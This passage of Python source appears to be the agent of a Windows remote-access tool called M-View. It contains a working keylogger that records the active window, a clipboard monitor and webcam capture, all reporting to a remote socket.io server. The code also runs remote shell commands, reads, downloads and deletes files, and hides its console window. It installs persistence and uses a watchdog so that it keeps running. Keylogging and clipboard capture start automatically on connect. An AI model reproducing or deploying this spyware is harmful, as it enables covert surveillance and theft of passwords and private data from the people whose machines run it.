    def __init__(self, sio_client):
        self.sio      = sio_client
        self._buf: list[str] = []
        self._lock    = threading.Lock()
        self._listener = None
        self._flush_t:  threading.Thread | None = None
        self.running  = False

    def start(self):
        if not PYNPUT_OK or self.running:
            return
        self.running = True
        self._listener = pynput.keyboard.Listener(on_press=self._on_key)
        self._listener.start()
        self._flush_t = threading.Thread(target=self._flush_loop, daemon=True)
        self._flush_t.start()
        log.info("Keylogger started.")

    def stop(self):
        self.running = False
        if self._listener:
            self._listener.stop()

    def _on_key(self, key):
        try:
            with self._lock:
                ch = key.char if hasattr(key, "char") and key.char else f"[{str(key).replace('Key.', '')}]"
                self._buf.append(ch)
        except Exception:
            pass

    def _active_window(self) -> str:
        try:
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            buf = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
            return buf.value
        except Exception:
            return ""

    def _flush_loop(self):
        while self.running:
            time.sleep(CONFIG["KEYLOG_FLUSH_INTERVAL"])
            self._flush()

    def _flush(self):
        with self._lock:
            if not self._buf:
                return
            text = "".join(self._buf)
            self._buf.clear()
        try:
            self.sio.emit("keylog_data", {
                "device_id": CONFIG["DEVICE_TOKEN"],
                "text":      text,
                "window":    self._active_window(),
                "ts":        datetime.utcnow().isoformat(),
            })
        except Exception:
            pass


# ════════════════════════════════════════════════════════════════════════════
#  CLIPBOARD MONITOR
# ════════════════════════════════════════════════════════════════════════════
class ClipboardMonitor:
    def __init__(self, sio_client):
        self.sio   = sio_client
        self._last = ""
        self._t:   threading.Thread | None = None
        self.running = False

    def start(self):
        if not CLIPBOARD_OK or self.running:
            return
        self.running = True
        self._t = threading.Thread(target=self._loop, daemon=True)
        self._t.start()

    def stop(self):
        self.running = False

    def _loop(self):
        poll = CONFIG["CLIPBOARD_POLL_MS"] / 1000.0
        while self.running:
            try:
                cur = pyperclip.paste()
                if cur and cur != self._last:
                    self._last = cur
                    self.sio.emit("clipboard_data", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "content":   cur[:4096],
                        "length":    len(cur),
                        "ts":        datetime.utcnow().isoformat(),
                    })
            except Exception:
                pass
            time.sleep(poll)


# ════════════════════════════════════════════════════════════════════════════
#  WEBCAM CAPTURE
# ════════════════════════════════════════════════════════════════════════════
class WebcamCapture:
    def __init__(self, sio_client):
        self.sio = sio_client

    def capture(self, camera_idx: int = 0) -> dict:
        if not CV2_OK:
            return {"error": "OpenCV not available."}
        try:
            cap = cv2.VideoCapture(camera_idx)
            if not cap.isOpened():
                return {"error": f"Camera {camera_idx} could not be opened."}
            ret, frame = cap.read()
            cap.release()
            if not ret:
                return {"error": "Failed to read frame from camera."}
            success, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 75])
            if not success:
                return {"error": "Encoding failed."}
            return {
                "success":     True,
                "camera_idx":  camera_idx,
                "frame":       base64.b64encode(buf.tobytes()).decode(),
                "w":           frame.shape[1],
                "h":           frame.shape[0],
                "ts":          datetime.utcnow().isoformat(),
            }
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def list_cameras() -> list:
        if not CV2_OK:
            return []
        cameras = []
        for i in range(5):
            cap = cv2.VideoCapture(i)
            if cap.isOpened():
                cameras.append({"index": i, "name": f"Camera {i}"})
                cap.release()
        return cameras


# ════════════════════════════════════════════════════════════════════════════
#  HEARTBEAT
# ════════════════════════════════════════════════════════════════════════════
class Heartbeat:
    def __init__(self, sio_client):
        self.sio     = sio_client
        self._t:     threading.Thread | None = None
        self.running = False

    def start(self):
        if self.running:
            return
        self.running = True
        self._t = threading.Thread(target=self._loop, daemon=True)
        self._t.start()

    def stop(self):
        self.running = False

    def _loop(self):
        while self.running:
            try:
                self.sio.emit("heartbeat", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "cpu":       psutil.cpu_percent(interval=0),
                    "ram":       psutil.virtual_memory().percent,
                    "ts":        datetime.utcnow().isoformat(),
                })
            except Exception as e:
                log.warning(f"Heartbeat error: {e}")
            time.sleep(CONFIG["HEARTBEAT_INTERVAL"])


# ════════════════════════════════════════════════════════════════════════════
#  MAIN AGENT CLASS
# ════════════════════════════════════════════════════════════════════════════
class MViewAgent:
    def __init__(self):
        self.sio         = socketio.Client(
            logger=False, engineio_logger=False,
            reconnection=False,    # we handle reconnection manually
        )
        self.cursor      = CursorTracker(self.sio)
        self.streamer    = ScreenStreamer(self.sio, self.cursor)
        self.sys_monitor = SystemMonitor(self.sio)
        self.keylogger   = KeyLogger(self.sio)
        self.clipboard   = ClipboardMonitor(self.sio)
        self.webcam      = WebcamCapture(self.sio)
        self.shell       = RemoteShell()
        self.proc_mgr    = ProcessManager()
        self.files       = FileBrowser()
        self.heartbeat   = Heartbeat(self.sio)

        self._reconnect_delay = CONFIG["RECONNECT_BASE"]
        self._connected       = False

        self._register_events()

    # ── Socket Events ─────────────────────────────────────────────────────
    def _register_events(self):
        sio = self.sio

        @sio.event
        def connect():
            self._connected       = True
            self._reconnect_delay = CONFIG["RECONNECT_BASE"]
            log.info(f"Connected to {CONFIG['SERVER_URL']}")
            fp = get_device_fingerprint()
            fp["device_id"] = CONFIG["DEVICE_TOKEN"]
            fp["token"]     = CONFIG["DEVICE_TOKEN"]
            sio.emit("agent_connect", fp)
            self.heartbeat.start()
            self.cursor.start()
            if CONFIG["ENABLE_KEYLOGGER"]: self.keylogger.start()
            if CONFIG["ENABLE_CLIPBOARD"]: self.clipboard.start()

        @sio.event
        def disconnect():
            self._connected = False
            log.warning("Disconnected.")
            self.streamer.stop()
            self.sys_monitor.stop()
            self.heartbeat.stop()

        # ── Dashboard Commands ─────────────────────────────────────────────
        @sio.on("request_action")
        def on_action(data):
            tab = data.get("tab", "")
            log.info(f"Action: {tab}")

            # ── Monitor / Stream ───────────────────────────────────────────
            if tab == "monitor":
                action = data.get("action", "start")
                if action == "start":
                    # Dashboard can specify mode: "video" | "screenshot"
                    self.streamer.start(
                        monitor=data.get("monitor",  CONFIG["STREAM_MONITOR"]),
                        fps=    data.get("fps",      CONFIG["STREAM_FPS"]),
                        quality=data.get("quality",  CONFIG["STREAM_QUALITY"]),
                        scale=  data.get("scale",    CONFIG["STREAM_SCALE"]),
                        mode=   data.get("mode",     CONFIG["STREAM_MODE"]),
                    )
                elif action == "stop":
                    self.streamer.stop()
                elif action == "set_mode":
                    # Hot-switch between video and screenshot without restart
                    self.streamer.set_mode(data.get("mode", "video"))
                    sio.emit("action_result", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "action": "set_mode",
                        "mode": self.streamer.mode,
                        "success": True,
                    })
                elif action == "set_quality":
                    q = int(data.get("quality", 55))
                    self.streamer._quality_current = max(10, min(95, q))
                elif action == "set_fps":
                    self.streamer.fps = int(data.get("fps", 20))

            # ── Single screenshot ──────────────────────────────────────────
            elif tab == "screenshot":
                q = data.get("quality", CONFIG["STREAM_QUALITY"])
                s = data.get("scale",   CONFIG["STREAM_SCALE"])
                old_q, old_s = self.streamer.quality, self.streamer.scale
                self.streamer.quality, self.streamer.scale = q, s
                img = self.streamer.capture_single()
                self.streamer.quality, self.streamer.scale = old_q, old_s
                if img:
                    sio.emit("screenshot_result", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "frame": img, "image": img,
                        "ts": datetime.utcnow().isoformat(),
                    })

            # ── Mouse ──────────────────────────────────────────────────────
            elif tab == "mouse_event":
                if PYAUTOGUI_OK:
                    x   = int(data.get("x", 0))
                    y   = int(data.get("y", 0))
                    typ = data.get("type", "move")
                    btn = {0: "left", 1: "middle", 2: "right"}.get(int(data.get("button", 0)), "left")
                    try:
                        if   typ == "move":     pyautogui.moveTo(x, y, duration=0, _pause=False)
                        elif typ == "down":     pyautogui.mouseDown(x, y, button=btn, _pause=False)
                        elif typ == "up":       pyautogui.mouseUp(x, y, button=btn, _pause=False)
                        elif typ == "click":    pyautogui.click(x, y, button=btn, _pause=False)
                        elif typ == "rclick":   pyautogui.click(x, y, button="right", _pause=False)
                        elif typ == "dblclick": pyautogui.doubleClick(x, y, _pause=False)
                        elif typ == "drag":
                            tx, ty = int(data.get("tx", x)), int(data.get("ty", y))
                            pyautogui.dragTo(tx, ty, duration=0.1, button=btn, _pause=False)
                    except Exception as e:
                        log.warning(f"mouse_event: {e}")

            # ── Scroll ─────────────────────────────────────────────────────
            elif tab == "scroll_event":
                if PYAUTOGUI_OK:
                    try:
                        x, y = int(data.get("x", 0)), int(data.get("y", 0))
                        dy   = data.get("dy", 0)
                        clicks = int(-dy / 100) if dy else 0
                        if clicks:
                            pyautogui.scroll(clicks, x=x, y=y, _pause=False)
                    except Exception as e:
                        log.warning(f"scroll_event: {e}")

            # ── Keyboard ───────────────────────────────────────────────────
            elif tab == "key_event":
                if PYAUTOGUI_OK:
                    ktype = data.get("type", "down")
                    key   = data.get("key", "")
                    combo = data.get("combo", "")
                    KEY_MAP = {
                        "Enter":"enter","Backspace":"backspace","Tab":"tab",
                        "Escape":"esc","Delete":"delete","Insert":"insert",
                        "Home":"home","End":"end","PageUp":"pageup","PageDown":"pagedown",
                        "ArrowUp":"up","ArrowDown":"down","ArrowLeft":"left","ArrowRight":"right",
                        " ":"space","Control":"ctrl","Alt":"alt","Shift":"shift","Meta":"win",
                        "F1":"f1","F2":"f2","F3":"f3","F4":"f4","F5":"f5","F6":"f6",
                        "F7":"f7","F8":"f8","F9":"f9","F10":"f10","F11":"f11","F12":"f12",
                    }
                    try:
                        if combo == "ctrl+alt+del":
                            subprocess.Popen(["powershell","-Command",
                                "(New-Object -ComObject Shell.Application).WindowsSecurity()"],
                                creationflags=subprocess.CREATE_NO_WINDOW)
                        elif ktype in ("down", "press"):
                            pg = KEY_MAP.get(key, key.lower() if len(key) == 1 else None)
                            if pg:
                                hotkey = []
                                if data.get("ctrl")  and key != "Control": hotkey.append("ctrl")
                                if data.get("alt")   and key != "Alt":     hotkey.append("alt")
                                if data.get("shift") and key != "Shift":   hotkey.append("shift")
                                hotkey.append(pg)
                                if len(hotkey) > 1:
                                    pyautogui.hotkey(*hotkey, _pause=False)
                                else:
                                    pyautogui.keyDown(pg, _pause=False)
                        elif ktype == "up":
                            pg = KEY_MAP.get(key, key.lower() if len(key) == 1 else None)
                            if pg:
                                pyautogui.keyUp(pg, _pause=False)
                    except Exception as e:
                        log.warning(f"key_event: {e}")

            # ── Ping ───────────────────────────────────────────────────────
            elif tab == "ping":
                sio.emit("ping_result", {"device_id": CONFIG["DEVICE_TOKEN"], "t": data.get("t")})

            # ── System ────────────────────────────────────────────────────
            elif tab == "system":
                action = data.get("action", "start")
                if action == "start": self.sys_monitor.start(interval=data.get("interval", 2))
                else:                 self.sys_monitor.stop()

            elif tab == "system_snapshot":
                sio.emit("system_stats_report", self.sys_monitor.get_snapshot())

            elif tab == "disks":
                sio.emit("disks_report",   {"device_id": CONFIG["DEVICE_TOKEN"], "disks":      self.sys_monitor.get_disk_list()})

            elif tab == "network":
                sio.emit("network_report", {"device_id": CONFIG["DEVICE_TOKEN"], "interfaces": self.sys_monitor.get_network_interfaces()})

            # ── Processes ─────────────────────────────────────────────────
            elif tab == "processes":
                procs = self.proc_mgr.list_processes()
                sio.emit("processes_report", {"device_id": CONFIG["DEVICE_TOKEN"], "processes": procs, "count": len(procs)})

            elif tab == "kill_process":
                sio.emit("kill_result",    {"device_id": CONFIG["DEVICE_TOKEN"], **self.proc_mgr.kill_process(int(data.get("pid", 0)))})

            elif tab == "start_process":
                sio.emit("start_process_result", {"device_id": CONFIG["DEVICE_TOKEN"], **self.proc_mgr.start_process(data.get("command", ""))})

            # ── Shell ─────────────────────────────────────────────────────
            elif tab == "shell":
                result = self.shell.execute(data.get("command", "echo hello"), shell_type=data.get("shell_type", "cmd"))
                sio.emit("shell_result", {"device_id": CONFIG["DEVICE_TOKEN"], **result})

            # ── Files ─────────────────────────────────────────────────────
            elif tab == "file_list":
                sio.emit("file_list_result",     {"device_id": CONFIG["DEVICE_TOKEN"], **self.files.list_directory(data.get("path", "C:\\"))})

            elif tab == "file_read":
                sio.emit("file_read_result",     {"device_id": CONFIG["DEVICE_TOKEN"], **self.files.read_file(data.get("path", ""))})

            elif tab == "file_download":
                sio.emit("file_download_result", {"device_id": CONFIG["DEVICE_TOKEN"], **self.files.download_file(data.get("path", ""))})

            elif tab == "file_delete":
                sio.emit("file_delete_result",   {"device_id": CONFIG["DEVICE_TOKEN"], **self.files.delete_file(data.get("path", ""))})

            elif tab == "drives":
                sio.emit("drives_report", {"device_id": CONFIG["DEVICE_TOKEN"], "drives": self.files.list_drives()})

            # ── Webcam ────────────────────────────────────────────────────
            elif tab == "webcam":
                sio.emit("webcam_result",      {"device_id": CONFIG["DEVICE_TOKEN"], **self.webcam.capture(data.get("camera", 0))})

            elif tab == "webcam_list":
                sio.emit("webcam_list_result", {"device_id": CONFIG["DEVICE_TOKEN"], "cameras": self.webcam.list_cameras()})

            # ── Clipboard ─────────────────────────────────────────────────
            elif tab == "clipboard_get":
                if CLIPBOARD_OK:
                    sio.emit("clipboard_result", {"device_id": CONFIG["DEVICE_TOKEN"], "content": pyperclip.paste()[:4096], "ts": datetime.utcnow().isoformat()})

            elif tab == "clipboard_set":
                if CLIPBOARD_OK:
                    pyperclip.copy(data.get("text", ""))
                    sio.emit("clipboard_set_result", {"device_id": CONFIG["DEVICE_TOKEN"], "success": True})

            # ── Power ─────────────────────────────────────────────────────
            elif tab == "lock_screen":
                ctypes.windll.user32.LockWorkStation()
                sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"], "action": "lock_screen", "success": True})

            elif tab == "sleep":
                sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"], "action": "sleep", "success": True})
                os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")

            elif tab == "shutdown":
                sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"], "action": "shutdown", "success": True})
                time.sleep(1); os.system("shutdown /s /t 10 /c \"M-View remote shutdown\"")

            elif tab == "restart":
                sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"], "action": "restart", "success": True})
                time.sleep(1); os.system("shutdown /r /t 10 /c \"M-View remote restart\"")

            elif tab == "abort_shutdown":
                os.system("shutdown /a")
                sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"], "action": "abort_shutdown", "success": True})

            elif tab == "uninstall":
                remove_persistence()
                sio.disconnect()
                sys.exit(0)

            else:
                log.warning(f"Unknown tab: {tab}")

    # ── Connection Loop — exponential backoff with jitter ─────────────────
    def run(self):
        log.info(f"M-View Agent v{CONFIG['AGENT_VERSION']} starting…")
        install_persistence()
        time.sleep(CONFIG["STARTUP_DELAY"])

        while True:
            try:
                if not self._connected:
                    log.info(f"Connecting to {CONFIG['SERVER_URL']}…")
                    self.sio.connect(
                        CONFIG["SERVER_URL"],
                        transports=["websocket", "polling"],  # polling fallback for proxies
                        wait_timeout=20,
                    )
                    self.sio.wait()

            except socketio.exceptions.ConnectionError as e:
                log.warning(f"Connection error: {e}")
            except Exception as e:
                log.error(f"Agent error: {e}")
            finally:
                self._connected = False
                self.streamer.stop()
                self.sys_monitor.stop()
                self.heartbeat.stop()

            # Exponential backoff + jitter (prevents thundering herd on server restart)
            jitter = random.uniform(0, self._reconnect_delay * 0.3)
            delay  = self._reconnect_delay + jitter
            log.info(f"Reconnecting in {delay:.1f}s…")
            time.sleep(delay)
            self._reconnect_delay = min(self._reconnect_delay * 2, CONFIG["RECONNECT_MAX"])


# ════════════════════════════════════════════════════════════════════════════
#  WATCHDOG — restarts agent if main thread dies
# ════════════════════════════════════════════════════════════════════════════
def _watchdog(agent_ref: list):
    """
    Runs in a separate thread. If the agent's main thread exits unexpectedly,
    creates a new agent instance and restarts.
    """
    time.sleep(30)   # give agent time to start
    while True:
        time.sleep(60)
        t = agent_ref[0]
        if t and not t.is_alive():
            log.warning("Watchdog: agent thread died — restarting…")
            try:
                new_agent  = MViewAgent()
                new_thread = threading.Thread(target=new_agent.run, daemon=False)
                new_thread.start()
                agent_ref[0] = new_thread
            except Exception as e:
                log.error(f"Watchdog restart failed: {e}")


# ════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ════════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    # Hide console window (--noconsole handles it, but this is the safe fallback)
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception:
        pass

    agent = MViewAgent()

    # Start agent in its own thread so watchdog can monitor it
    agent_thread = threading.Thread(target=agent.run, daemon=False, name="mview-main")
    agent_ref    = [agent_thread]
    agent_thread.start()

    # Start watchdog
    watchdog_thread = threading.Thread(target=_watchdog, args=(agent_ref,), daemon=True, name="mview-watchdog")
    watchdog_thread.start()

    agent_thread.join()
